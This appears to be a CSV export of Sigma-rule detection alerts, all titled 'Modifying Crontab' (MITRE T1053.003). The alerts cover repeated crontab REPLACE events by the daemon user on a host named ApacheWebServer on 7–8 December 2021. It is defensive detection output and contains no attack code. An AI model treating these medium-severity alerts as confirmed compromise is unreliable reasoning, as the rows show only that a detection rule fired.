Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28487; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1495,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28491; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1497,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28501; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1499,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28507; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1501,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28515; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1503,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28521; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1505,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28528; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1507,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28532; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1510,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28544; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1512,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28547; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1514,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:03,T1053.003,timestamp_utc=2021-12-08 15:59:03; timestamp=Dec  8 15:59:03; host=ApacheWebServer; process=crontab; pid=28553; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1516,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:03,T1053.003,timestamp_utc=2021-12-08 15:59:03; timestamp=Dec  8 15:59:03; host=ApacheWebServer; process=crontab; pid=28559; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1518,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:04,T1053.003,timestamp_utc=2021-12-08 15:59:04; timestamp=Dec  8 15:59:04; host=ApacheWebServer; process=crontab; pid=28568; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1520,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28584; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1522,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28594; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1524,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28598; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1526,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28603; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1528,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28608; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1530,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28612; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1532,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28619; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1534,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:07,T1053.003,timestamp_utc=2021-12-08 15:59:07; timestamp=Dec  8 15:59:07; host=ApacheWebServer; process=crontab; pid=28629; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1536,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:07,T1053.003,timestamp_utc=2021-12-08 15:59:07; timestamp=Dec  8 15:59:07; host=ApacheWebServer; process=crontab; pid=28642; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1538,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28649; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1540,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28656; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1542,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28661; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1544,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28667; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1546,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28670; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1548,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28674; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1550,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28682; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1552,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28688; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1554,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28700; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1556,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28706; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1558,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28712; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1560,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28719; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1562,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28722; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1564,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28726; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1566,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28733; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1568,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28737; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1570,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28747; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1572,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:13,T1053.003,timestamp_utc=2021-12-08 15:59:13; timestamp=Dec  8 15:59:13; host=ApacheWebServer; process=crontab; pid=28753; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1574,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:13,T1053.003,timestamp_utc=2021-12-08 15:59:13; timestamp=Dec  8 15:59:13; host=ApacheWebServer; process=crontab; pid=28761; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1576,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:14,T1053.003,timestamp_utc=2021-12-08 15:59:14; timestamp=Dec  8 15:59:14; host=ApacheWebServer; process=crontab; pid=28774; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1579,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:17,T1053.003,timestamp_utc=2021-12-07 10:06:17; timestamp=Dec  7 10:06:17; host=ApacheWebServer; process=crontab; pid=18224; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=479,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18227; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=481,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18232; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=483,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18235; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=485,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18238; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=487,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18241; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=489,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18244; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=491,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18247; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=493,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18250; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=495,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18253; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=497,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18256; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=499,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18259; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=501,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18263; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=503,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18266; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=505,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18272; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=507,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18275; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=509,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18279; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=511,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
